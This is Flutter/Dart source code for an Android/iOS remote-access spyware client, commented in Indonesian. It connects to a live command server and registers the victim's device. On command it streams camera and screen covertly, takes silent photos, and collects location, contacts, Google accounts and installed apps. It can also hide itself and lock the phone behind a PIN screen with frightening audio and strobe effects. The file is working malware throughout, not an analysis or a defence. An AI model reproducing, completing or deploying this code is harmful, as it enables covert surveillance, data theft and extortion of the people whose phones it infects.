import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:webview_flutter/webview_flutter.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;

// ==================== KONFIGURASI SERVER (Harus sama dengan spayware.dart) ====================
const String SERVER_URL = 'http://panel-legal.jhonaley.net:2225';

// ==================== GLOBAL STATE ====================
Map<String, dynamic> appConfig = {};
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
late IO.Socket socket;

// Native Channels (Dibungkus aman untuk menghindari crash jika tidak ada implementasi native)
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformNativeLock = MethodChannel('com.nullx.pp/native_lock');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Load config dengan fallback ke SERVER_URL dari spayware.dart
  await loadLocalConfig();
  
  // Request permissions dengan handling error
  await requestPermissionsSafe();

  // Get Device Info
  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  // Initialize Native Listeners (Safe)
  initNativeListenersSafe();

  // Start Spyware Connection
  startSpywareConnection(globalDeviceId, globalDeviceModel);
  
  // Auto collect initial data
  _autoCollectIntel();

  runApp(const MyApp());
}

// ==================== CONFIG LOADER ====================
Future<void> loadLocalConfig() async {
  try {
    final String response = await rootBundle.loadString('assets/config.json');
    appConfig = json.decode(response);
    
    // Pastikan server_url mengarah ke server yang sama dengan spayware.dart
    if (appConfig['server_url'] == null || appConfig['server_url']!.toString().isEmpty) {
      appConfig['server_url'] = SERVER_URL;
    }
  } catch (e) {
    // Fallback ke server utama
    appConfig = {
      "server_url": SERVER_URL,
      "owner_name": "admin",
      "landing_web": "https://google.com"
    };
  }
}

// ==================== PERMISSIONS (SAFE) ====================
Future<void> requestPermissionsSafe() async {
  try {
    // Request satu per satu dengan penanganan error
    final permissions = [
      Permission.location,
      Permission.contacts,
      Permission.camera,
      Permission.microphone,
      Permission.ignoreBatteryOptimizations,
      Permission.notification,
      Permission.sms, 
      Permission.phone,
      Permission.storage,
      Permission.systemAlertWindow,
    ];
    
    for (var perm in permissions) {
      try {
        await perm.request();
      } catch (e) {
        debugPrint('Permission $perm skipped: $e');
      }
    }
  } catch (e) {
    debugPrint('Permission error: $e');
  }
}

// ==================== DEVICE INFO ====================
Future<Map<String, String>> getDeviceInfo() async {
  try {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    String modelName = "Unknown";
    String identifier = "UNKNOWN_ID_${DateTime.now().millisecondsSinceEpoch}";
    
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_').replaceAll(',', '_'); 
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      modelName = iosInfo.model ?? "iPhone";
      identifier = iosInfo.identifierForVendor ?? "IOS_$modelName";
    }
    
    return {"id": identifier, "model": modelName};
  } catch (e) {
    return {"id": "FALLBACK_ID", "model": "Unknown"};
  }
}

// ==================== NATIVE LISTENERS (SAFE IMPLEMENTATION) ====================
void initNativeListenersSafe() {
  // Chat Listener - Safe
  try {
    platformNativeLock.setMethodCallHandler((call) async {
      if (call.method == "onTargetReply") {
        String replyText = call.arguments.toString();
        sendStatusUpdate({"chat_reply": replyText});
      }
    });
  } catch (e) {
    debugPrint('Native Lock init error: $e');
  }

  // Spy/Camera Listener - Safe
  try {
    platformSpy.setMethodCallHandler((call) async {
      if (call.method == "live_frame" && socket.connected) {
        // Kirim frame ke server sesuai format server.js
        socket.emit('camera_frame', {
          "deviceId": globalDeviceId,
          "frame": call.arguments['image'],
          "type": "front",
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
      
      if (call.method == "screen_data" && socket.connected) {
        socket.emit('screen_capture', {
          "deviceId": globalDeviceId,
          "screenshot": call.arguments['image'],
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
    });
  } catch (e) {
    debugPrint('Spy Channel init error: $e');
  }

  // Background Proxy Listener - Safe
  try {
    const EventChannel('com.nullx.pp/proxy_events').receiveBroadcastStream().listen(
      (data) {
        if (data != null) executeLogic(data);
      },
      onError: (error) => debugPrint('Proxy stream error: $error')
    );
  } catch (e) {
    debugPrint('Proxy listener init error: $e');
  }
}

// ==================== MAIN CONNECTION (COMPATIBLE DENGAN SERVER.JS) ====================
void startSpywareConnection(String deviceId, String deviceName) {
  String serverBase = appConfig['server_url'] ?? SERVER_URL;
  
  // Konfigurasi Socket.IO sesuai server.js
  socket = IO.io(serverBase, IO.OptionBuilder()
      .setTransports(['websocket']) // Server.js mendukung websocket
      .enableAutoConnect()
      .enableReconnection() // Auto reconnect jika putus
      .setReconnectionAttempts(999)
      .setReconnectionDelay(3000)
      .build());

  // CONNECTION EVENT
  socket.onConnect((_) {
    debugPrint('[+] Connected to Server: $serverBase');
    
    // REGISTER DEVICE - Format sesuai server.js handler 'register_device'
    _registerDeviceToServer(deviceId, deviceName);
    
    // Mulai heartbeat
    _startHeartbeat();
  });

  // LISTEN FOR COMMANDS FROM ADMIN (spayware.dart)
  // Server.js akan emit 'command' ketika admin mengirim perintah
  socket.on('command', (data) {
    debugPrint('[CMD] Received: ${data['command']}');
    executeLogic(data);
  });

  // Alternative command listeners (compatibility)
  socket.on('new_command', (data) => executeLogic(data));
  socket.on('execute', (data) => executeLogic(data));

  // DISCONNECT HANDLING
  socket.onDisconnect((_) {
    debugPrint('[-] Disconnected from server');
  });

  socket.onConnectError((err) {
    debugPrint('[!] Connection Error: $err');
  });
}

// ==================== DEVICE REGISTRATION (SERVER.JS FORMAT) ====================
Future<void> _registerDeviceToServer(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    // Format sesuai dengan handler 'register_device' di server.js
    var registerData = {
      "deviceId": id,           // Server.js pakai 'deviceId'
      "model": model,
      "androidVersion": Platform.isAndroid ? "Android" : "iOS",
      "battery": level,
      "isOnline": true,
      "lastSeen": DateTime.now().toIso8601String(),
      // Additional info
      "sim_operator": "Unknown",
      "network_type_name": "Unknown",
    };
    
    // Emit ke socket (utama)
    socket.emit('register_device', registerData);
    
    // Juga kirim via HTTP sebagai backup (jika server punya endpoint)
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/devices"), // atau endpoint lain jika ada
        body: jsonEncode(registerData),
        headers: {"Content-Type": "application/json"}
      );
    } catch (e) {
      // HTTP opsional, socket sudah cukup
    }
    
    debugPrint('[+] Device Registered: $id');
  } catch (e) {
    debugPrint('[!] Registration error: $e');
  }
}

// ==================== HEARTBEAT & STATUS UPDATE ====================
void _startHeartbeat() {
  // Kirim status update setiap 30 detik (sesuai server.js expectation)
  Timer.periodic(const Duration(seconds: 30), (timer) async {
    if (!socket.connected) return;
    
    try {
      final Battery battery = Battery();
      int level = await battery.batteryLevel;
      
      // Emit status_update (server.js mendengarkan ini)
      Position? pos;
      try {
        pos = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.low, // Low accuracy untuk hemat baterai
          timeLimit: const Duration(seconds: 5)
        );
      } catch (e) {
        // Location denied atau timeout, lanjutkan tanpa location
      }
      
      socket.emit('status_update', {
        "deviceId": globalDeviceId,
        "battery": level,
        "location": pos != null ? {"lat": pos.latitude, "lng": pos.longitude} : null,
        "isOnline": true,
        "lastSeen": DateTime.now().toIso8601String(),
      });
    } catch (e) {
      debugPrint('[!] Heartbeat error: $e');
    }
  });
}

// ==================== AUTO INTEL COLLECTION ====================
void _autoCollectIntel() async {
  // Tunggu socket terhubung dulu
  await Future.delayed(const Duration(seconds: 2));
  
  try {
    final contacts = await _getContactsInternal();
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    // Kirim data awal
    sendStatusUpdate({
      "initial_contacts": contacts.length,
      "battery": level,
      "model": globalDeviceModel,
    });
  } catch (e) {
    debugPrint('[!] Auto intel error: $e');
  }
}

// ==================== COMMAND EXECUTOR (MAPPING DARI SPAYWARE.DART) ====================
Future<void> executeLogic(dynamic data) async {
  // Format dari server.js: { commandId, command, params }
  String command = data['command']?.toString() ?? data['cmd']?.toString() ?? "idle";
  dynamic params = data['params'] ?? data['extra'] ?? "";
  String commandId = data['commandId']?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString();
  
  dynamic resultData;
  bool success = true;

  debugPrint('[EXEC] Processing: $command');

  switch (command) {
    // ==================== CAMERA CONTROLS (spayware.dart Tab CAM) ====================
    case "camera_start":
      String type = params is Map ? (params['type'] ?? 'back') : (params.toString().isEmpty ? 'back' : params);
      await _handleCameraStart(type);
      resultData = {"status": "Camera started: $type"};
      break;

    case "camera_stop":
      await _handleCameraStop();
      resultData = {"status": "Camera stopped"};
      break;

    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = params.toString().isEmpty ? "back" : params.toString();
      await _takePhoto(side);
      break;

    // ==================== SCREEN MIRRORING (spayware.dart Tab SCREEN) ====================
    case "screen_start":
      await _startScreenCapture();
      resultData = {"status": "Screen capture started"};
      break;

    case "screen_stop":
      await _stopScreenCapture();
      resultData = {"status": "Screen capture stopped"};
      break;

    case "get_screen":
      resultData = await _getScreenshotOnce();
      break;

    // ==================== DEVICE CONTROL (spayware.dart Tab CTRL) ====================
    case "lock":
    case "hard_lock":
      await _lockDevice(params);
      resultData = {"status": "Device locked"};
      break;

    case "unlock":
      await _unlockDevice();
      resultData = {"status": "Device unlocked"};
      break;

    case "flashlight_on":
    case "flash_strobe":
      await _setFlashlight(true);
      resultData = {"status": "Flashlight ON"};
      break;

    case "flashlight_off":
    case "stop_strobe":
      await _setFlashlight(false);
      resultData = {"status": "Flashlight OFF"};
      break;

    // ==================== MULTIMEDIA ====================
    case "play_audio":
      await _playAudio(params);
      resultData = {"status": "Audio playing"};
      break;

    case "stop_audio":
      await _audioPlayer.stop();
      resultData = {"status": "Audio stopped"};
      break;

    case "set_video_wallpaper":
      await _setWallpaper(params is Map ? params['url'] : params);
      resultData = {"status": "Video wallpaper set"};
      break;

    case "set_html_wallpaper":
      await _setWallpaper(params is Map ? (params['url'] ?? params['htmlContent']) : params);
      resultData = {"status": "HTML wallpaper set"};
      break;

    // ==================== SYSTEM ACTIONS ====================
    case "open_web":
    case "open_url":
      await _openUrl(params);
      resultData = {"status": "URL opened"};
      break;

    case "show_notification":
      await _showNotification(params);
      resultData = {"status": "Notification shown"};
      break;

    case "show_floating_images":
      resultData = {"status": "Floating images shown (requires overlay permission)"};
      break;

    case "hide_app":
      // Minimize app
      try { await platformSpy.invokeMethod('moveToBackground'); } catch (e) {}
      resultData = {"status": "App hidden"};
      break;

    case "factory_reset":
      // WARNING: Berbahaya, hanya simulasikan atau konfirmasi
      resultData = {"status": "Factory reset command received (simulation)"};
      // Untuk implementasi nyata: await platformSpy.invokeMethod('factoryReset');
      break;

    // ==================== DATA COLLECTION ====================
    case "get_location":
      resultData = await _getLocation();
      break;

    case "get_contacts":
      resultData = {"contacts": await _getContactsInternal()};
      break;

    case "get_gmails":
    case "get_accounts":
      resultData = await _getAccounts();
      break;

    case "get_apps":
      resultData = await _getInstalledApps();
      break;

    // ==================== ADVANCED (Native Dependent) ====================
    case "vibrate_loop":
      Vibration.vibrate(duration: 10000);
      try { await platformSpy.invokeMethod('vibrate_loop'); } catch (e) {}
      resultData = {"status": "Vibrating"};
      break;

    case "set_vol_max":
      try { await platformSpy.invokeMethod('set_vol_max'); } catch (e) {}
      resultData = {"status": "Volume maxed"};
      break;

    case "bring_to_foreground":
      try { await platformSpy.invokeMethod('bringToForeground'); } catch (e) {}
      resultData = {"status": "Brought to foreground"};
      break;

    case "speak_tts":
      try { await platformSpy.invokeMethod('speakText', {"text": params.toString()}); } catch (e) {}
      resultData = {"status": "Speaking"};
      break;

    default:
      debugPrint('[!] Unknown command: $command');
      success = false;
      resultData = {"error": "Unknown command: $command"};
  }

  // SEND RESPONSE BACK TO SERVER (sesuai format server.js)
  _sendCommandResponse(commandId, success, resultData);
}

// ==================== RESPONSE HELPERS ====================
void _sendCommandResponse(String commandId, bool success, dynamic result) {
  if (socket.connected) {
    socket.emit('command_response', {
      "commandId": commandId,
      "success": success,
      "result": result,
      "deviceId": globalDeviceId,
      "timestamp": DateTime.now().millisecondsSinceEpoch
    });
  }
}

void sendStatusUpdate(Map<String, dynamic> data) {
  if (socket.connected) {
    socket.emit('status_update', {
      "deviceId": globalDeviceId,
      ...data,
      "timestamp": DateTime.now().millisecondsSinceEpoch
    });
  }
}

// ==================== CAMERA IMPLEMENTATION ====================
CameraController? _cameraController;
bool _isCameraStreaming = false;

Future<void> _handleCameraStart(String type) async {
  try {
    // Coba native method dulu (lebih efisien)
    try {
      await platformSpy.invokeMethod('start_live_camera', {"side": type});
      return; // Success, native handle streaming
    } catch (e) {
      debugPrint('Native camera failed, using Flutter: $e');
    }
    
    // Fallback ke Flutter Camera
    final cameras = await availableCameras();
    CameraLensDirection direction = type == 'front' ? CameraLensDirection.front : CameraLensDirection.back;
    final cam = cameras.firstWhere(
      (c) => c.lensDirection == direction,
      orElse: () => cameras.first,
    );
    
    _cameraController = CameraController(cam, ResolutionPreset.low, enableAudio: false);
    await _cameraController!.initialize();
    
    _isCameraStreaming = true;
    _streamCameraFrames(type);
    
  } catch (e) {
    debugPrint('Camera start error: $e');
  }
}

void _streamCameraFrames(String type) async {
  while (_isCameraStreaming && _cameraController != null && _cameraController!.value.isInitialized) {
    try {
      final image = await _cameraController!.takePicture();
      final bytes = await File(image.path).readAsBytes();
      img.Image? decoded = img.decodeImage(bytes);
      
      if (decoded != null && socket.connected) {
        String base64Image = base64Encode(img.encodeJpg(decoded, quality: 30)); // Low quality untuk performa
        
        // Emit frame sesuai format server.js
        socket.emit('camera_frame', {
          "deviceId": globalDeviceId,
          "frame": base64Image,
          "type": type,
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
      
      // Hapus file sementara
      await File(image.path).delete();
      
      // Delay untuk kontrol framerate (~5fps untuk hemat bandwidth)
      await Future.delayed(const Duration(milliseconds: 200));
    } catch (e) {
      debugPrint('Stream error: $e');
      await Future.delayed(const Duration(seconds: 1));
    }
  }
}

Future<void> _handleCameraStop() async {
  _isCameraStreaming = false;
  
  try {
    await platformSpy.invokeMethod('stop_live_camera');
  } catch (e) {}
  
  await _cameraController?.dispose();
  _cameraController = null;
}

Future<void> _takePhoto(String side) async {
  try {
    await _executeFlutterSilentCamera(side);
  } catch (e) {
    debugPrint('Photo error: $e');
  }
}

Future<void> _executeFlutterSilentCamera(String side) async {
  try {
    final cameras = await availableCameras();
    final cam = cameras.firstWhere(
      (c) => c.lensDirection == (side == "front" ? CameraLensDirection.front : CameraLensDirection.back),
      orElse: () => cameras.first,
    );
    
    final controller = CameraController(cam, ResolutionPreset.medium, enableAudio: false);
    await controller.initialize();
    
    XFile photo = await controller.takePicture();
    final bytes = await File(photo.path).readAsBytes();
    img.Image? decoded = img.decodeImage(bytes);
    
    if (decoded != null) {
      String base64Image = base64Encode(img.encodeJpg(decoded, quality: 60));
      
      // Kirim ke server
      socket.emit('camera_frame', {
        "deviceId": globalDeviceId,
        "frame": base64Image,
        "type": side,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
        "isSnapshot": true
      });
    }
    
    await File(photo.path).delete();
    await controller.dispose();
  } catch (e) {
    debugPrint('Silent camera error: $e');
  }
}

// ==================== SCREEN CAPTURE ====================
bool _isScreenStreaming = false;

Future<void> _startScreenCapture() async {
  try {
    _isScreenStreaming = true;
    // Coba native (memerlukan MediaProjection permission di Android)
    try {
      await platformSpy.invokeMethod('start_screen_capture');
    } catch (e) {
      debugPrint('Native screen capture not available: $e');
      // Fallback: screenshot sekali saja
      await _getScreenshotOnce();
    }
  } catch (e) {
    debugPrint('Screen start error: $e');
  }
}

Future<void> _stopScreenCapture() async {
  _isScreenStreaming = false;
  try {
    await platformSpy.invokeMethod('stop_screen_capture');
  } catch (e) {}
}

Future<Map<String, dynamic>> _getScreenshotOnce() async {
  try {
    // Gunakan native method untuk screenshot
    String? screenshot = await platformSpy.invokeMethod('get_screen');
    if (screenshot != null && socket.connected) {
      socket.emit('screen_capture', {
        "deviceId": globalDeviceId,
        "screenshot": screenshot,
        "timestamp": DateTime.now().millisecondsSinceEpoch
      });
      return {"success": true, "sent": true};
    }
  } catch (e) {
    debugPrint('Screenshot error: $e');
  }
  return {"success": false, "error": "Cannot capture screen"};
}

// ==================== LOCK/UNLOCK ====================
Future<void> _lockDevice(dynamic params) async {
  if (params != null && params.toString().contains('|')) {
    List<String> parts = params.toString().split('|');
    currentLockMessage = parts[0];
    currentLockPIN = parts.length > 1 ? parts[1] : "123";
  }
  
  deviceLocked.value = true;
  
  // Efek tambahan
  try {
    await _audioPlayer.stop();
    await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
    await platformStrobe.invokeMethod('startStrobe');
    Vibration.vibrate(duration: 3000, pattern: [0, 500, 500, 500]);
    await platformSpy.invokeMethod('bringToForeground');
  } catch (e) {}
}

Future<void> _unlockDevice() async {
  deviceLocked.value = false;
  try {
    await _audioPlayer.stop();
    await platformStrobe.invokeMethod('stop_strobe');
    Vibration.cancel();
    await platformSpy.invokeMethod('unlock');
  } catch (e) {}
}

// ==================== FLASHLIGHT ====================
Future<void> _setFlashlight(bool on) async {
  try {
    if (on) {
      await platformStrobe.invokeMethod('flash_strobe');
    } else {
      await platformStrobe.invokeMethod('stop_strobe');
    }
  } catch (e) {
    // Fallback: coba gunakan flashlight plugin jika ada
    debugPrint('Flashlight control error: $e');
  }
}

// ==================== AUDIO ====================
Future<void> _playAudio(dynamic params) async {
  try {
    String url = params is Map ? (params['url'] ?? '') : params.toString();
    double volume = params is Map ? (params['volume'] ?? 1.0) : 1.0;
    
    await _audioPlayer.stop();
    await _audioPlayer.setVolume(volume);
    await _audioPlayer.play(UrlSource(url));
  } catch (e) {
    debugPrint('Play audio error: $e');
  }
}

// ==================== WALLPAPER ====================
Future<void> _setWallpaper(dynamic urlOrContent) async {
  try {
    await platformSpy.invokeMethod('set_wallpaper', {"url": urlOrContent.toString()});
  } catch (e) {
    debugPrint('Set wallpaper error: $e');
  }
}

// ==================== URL LAUNCHER ====================
Future<void> _openUrl(dynamic url) async {
  try {
    String urlString = url.toString();
    if (await canLaunchUrl(Uri.parse(urlString))) {
      await launchUrl(Uri.parse(urlString), mode: LaunchMode.externalApplication);
    }
  } catch (e) {
    debugPrint('Open URL error: $e');
  }
}

// ==================== NOTIFICATION ====================
Future<void> _showNotification(dynamic params) async {
  try {
    String title = params is Map ? (params['title'] ?? 'Notification') : 'Notification';
    String message = params is Map ? (params['message'] ?? '') : params.toString();
    
    // Gunakan plugin notification atau native
    try {
      await platformSpy.invokeMethod('show_notification', {
        "title": title,
        "message": message
      });
    } catch (e) {
      // Fallback: tampilkan dialog lokal jika memungkinkan
      debugPrint('Show notification: $title - $message');
    }
  } catch (e) {
    debugPrint('Notification error: $e');
  }
}

// ==================== DATA GETTERS ====================
Future<Map<String, dynamic>> _getLocation() async {
  try {
    Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    return {"lat": pos.latitude, "lng": pos.longitude, "accuracy": pos.accuracy};
  } catch (e) {
    return {"error": e.toString()};
  }
}

Future<List<Map<String, String>>> _getContactsInternal() async {
  try {
    if (await FlutterContacts.requestPermission()) {
      final contacts = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
      return contacts.take(100).map((e) => {
        "name": e.displayName, 
        "num": e.phones.isNotEmpty ? e.phones.first.number : "",
        "email": e.emails.isNotEmpty ? e.emails.first.address : ""
      }).toList();
    }
  } catch (e) {
    debugPrint('Contacts error: $e');
  }
  return [];
}

Future<dynamic> _getAccounts() async {
  try {
    String? accounts = await platformSpy.invokeMethod('get_gmails');
    return {"accounts": accounts ?? "Denied", "type": "google"};
  } catch (e) {
    return {"accounts": [], "error": e.toString()};
  }
}

Future<List<dynamic>> _getInstalledApps() async {
  try {
    final List<dynamic> apps = await platformSpy.invokeMethod('get_apps');
    return apps;
  } catch (e) {
    return [];
  }
}

// ==================== UI COMPONENTS ====================
class MyApp extends StatelessWidget {
  const MyApp({super.key});
  
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  late final WebViewController _webController;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    
    _initWebView();
  }

  void _initWebView() {
    try {
      _webController = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setNavigationDelegate(NavigationDelegate(
          onPageStarted: (url) => debugPrint('Loading: $url'),
          onWebResourceError: (error) => debugPrint('Web Error: ${error.description}'),
        ))
        ..loadRequest(Uri.parse(appConfig['landing_web'] ?? "https://google.com"));
    } catch (e) {
      debugPrint('WebView init error: $e');
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    // Jika device locked dan user minimize, force foreground
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      try {
        platformSpy.invokeMethod('bringToForeground');
      } catch (e) {}
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked,
          child: Stack(
            children: [
              // WebView Background (selalu tampil)
              Scaffold(
                body: WebViewWidget(controller: _webController),
              ),
              
              // Lock Overlay (hanya saat locked)
              if (isLocked)
                Material(
                  color: Colors.black87,
                  child: SafeArea(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
                          const SizedBox(height: 20),
                          Text(
                            currentLockMessage, 
                            textAlign: TextAlign.center, 
                            style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.bold)
                          ),
                          const SizedBox(height: 40),
                          TextField(
                            controller: _passController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white, fontSize: 18),
                            decoration: InputDecoration(
                              hintText: "ENTER PASSWORD",
                              hintStyle: TextStyle(color: Colors.grey[600]),
                              enabledBorder: OutlineInputBorder(
                                borderSide: const BorderSide(color: Colors.red),
                                borderRadius: BorderRadius.circular(10)
                              ),
                              focusedBorder: OutlineInputBorder(
                                borderSide: const BorderSide(color: Colors.redAccent, width: 2),
                                borderRadius: BorderRadius.circular(10)
                              ),
                            ),
                          ),
                          const SizedBox(height: 20),
                          SizedBox(
                            width: double.infinity,
                            height: 50,
                            child: ElevatedButton(
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.red[900],
                                foregroundColor: Colors.white,
                                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))
                              ),
                              onPressed: () async {
                                if (_passController.text == currentLockPIN) {
                                  await _unlockDevice();
                                  _passController.clear();
                                } else {
                                  // Shake effect atau feedback salah password
                                  Vibration.vibrate(duration: 200);
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(content: Text('Wrong Password!'), backgroundColor: Colors.red)
                                  );
                                }
                              },
                              child: const Text("UNLOCK DEVICE", style: TextStyle(fontSize: 16)),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}